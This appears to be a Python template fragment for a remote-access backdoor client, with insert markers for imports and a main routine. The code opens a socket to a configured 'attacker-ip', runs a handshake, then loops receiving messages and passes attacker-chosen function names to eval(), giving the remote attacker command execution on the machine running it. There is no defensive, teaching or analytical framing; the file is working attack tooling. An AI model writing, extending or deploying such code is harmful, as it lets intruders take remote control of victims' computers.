if __name__ == "__main__": exit()







# [begin-insert: imports] #



import socket
import json



# [end-insert: imports] #







# [begin-insert: before-main] #



def receive_data(context):
	suffix = context.get("protocol").get("message-suffix")
	context["data"] = ""
	while not context.get("data").endswith(suffix):
		context["data"] += context.get("socket").recv(context.get("protocol").get("buffer-size")).decode()
	return context.get("data").strip(suffix)



def handle_error(context, error_message):
	print(f"ERROR: {error_message}")
	if context and context.get("socket"): context.get("socket").close()
	exit()



def debug_write(*args, **kwargs):
	___DEBUG_MODE_ENABLED___new___ = None
	if "DEBUG_MODE_ENABLED" in globals():
		___DEBUG_MODE_ENABLED___new___ = globals().get("DEBUG_MODE_ENABLED")
	else:
		___DEBUG_MODE_ENABLED___new___ = False

	if ___DEBUG_MODE_ENABLED___new___:
		print(*args, **kwargs)

# [end-insert: before-main] #







# [begin-insert: main] #



def __main():
	eval("main()")

	___INSERTED_PROTOCOL___new___ = None
	if not "___INSERTED_PROTOCOL___" in globals(): handle_error(None, "No protocol inserted.")
	___INSERTED_PROTOCOL___new___ = globals().get("___INSERTED_PROTOCOL___")

	context = {}

	debug_write("Fetching protocol...")
	context["protocol"] = json.loads(___INSERTED_PROTOCOL___new___)
	debug_write("Creating socket...")
	context["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	debug_write("Parsing protocol...")
	protocol, buffer_size, attacker_ip, acceptable_ports, sock, suffix, normal_sub_proto = None, None, None, None, None, None, None
	try:
		protocol = context.get("protocol")
		buffer_size = protocol.get("buffer-size")
		attacker_ip = protocol.get("attacker-ip")
		acceptable_ports = protocol.get("acceptable-ports")
		sock = context.get("socket")
		suffix = protocol.get("message-suffix")
		suffix = "" if suffix == None else suffix
		normal_sub_proto = protocol.get("normal-sub-protocol")
	except Exception as e:
		debug_write("Exception occurred while parsing protocol:", e)

	debug_write("Validating protocol...")
	if not protocol: handle_error(context, "Protocol file was found but `json.loads` failed.")
	if not buffer_size: handle_error(context, "Invalid protocol: `buffer-size` is not defined.")
	if protocol.get("fallback-ip"): handle_error(context, "Invalid protocol: `fallback-ip` has not been implemented yet.")

	if not attacker_ip: handle_error(context, "Invalid protocol: `attacker-ip` is not defined.")
	if not acceptable_ports: handle_error(context, "Invalid protocol: `acceptable-ports` is not defined.")
	if len(acceptable_ports) != 1:
		handle_error(context, "Invalid protocol: the feature for multiple `acceptable-ports` has not been implemented yet.")

	if not sock: handle_error(context, "Socket could not be created.")

	if not normal_sub_proto: handle_error(context, "Invalid protocol: `normal-sub-protocol` is not defined.")
	if not normal_sub_proto.get("function-configurations"):
		handle_error(context, "Invalid protocol: `function-configurations` is not defined within `normal-sub-protocol`.")

	debug_write("Connecting to attacker...")
	sock.connect((attacker_ip, acceptable_ports[0]))

	debug_write("Commencing handshake...")
	if protocol.get("handshake-sub-protocol"):
		hs_sub_proto = protocol.get("handshake-sub-protocol")

		if not hs_sub_proto.get("server"): handle_error(context, "Invalid handshake sub-protocol: `server` is not defined.")
		if not hs_sub_proto.get("client"): handle_error(context, "Invalid handshake sub-protocol: `client` is not defined.")

		hs_server_proto = hs_sub_proto.get("server")
		hs_client_proto = hs_sub_proto.get("client")

		if not hs_server_proto.get("unconditional-sequence"):
			handle_error(context, "Invalid handshake sub-protocol: `unconditional-sequence` is not defined within `server`.")

		if not hs_client_proto.get("unconditional-sequence"):
			handle_error(context, "Invalid handshake sub-protocol: `unconditional-sequence` is not defined within `client`.")
		
		for message in hs_client_proto.get("unconditional-sequence"):
			debug_write(f"Receiving message...")
			data = sock.recv(buffer_size)
			debug_write(f"Sending message: {data}")
			sock.send(message.encode())
			break # for now



	while True:
		debug_write("Receiving data...")
		context["data"] = receive_data(context)
		data = context.get("data")

		for function_configuration in normal_sub_proto.get("function-configurations"):
			if function_configuration.get("data-must-equal"):
				if data == function_configuration.get("data-must-equal"):
					debug_write(f"1. Calling function: {function_configuration.get('function-to-call-on-match')}")
					eval(f"{function_configuration.get('function-to-call-on-match')}(context)")
			elif function_configuration.get("data-must-be-prefixed"):
				if data.startswith(function_configuration.get('data-must-be-prefixed')):
					debug_write(f"2. Calling function: {function_configuration.get('function-to-call-on-match')}")
					eval(f"{function_configuration.get('function-to-call-on-match')}(context)")
			elif function_configuration.get("data-can-be-anything"):
				debug_write(f"3. Calling function: {function_configuration.get('function-to-call-on-match')}")
				eval(f"{function_configuration.get('function-to-call-on-match')}(context)")
			else:
				print("Error: Invalid function configuration.")
				sock.close()



	sock.close()



# [end-insert: main] #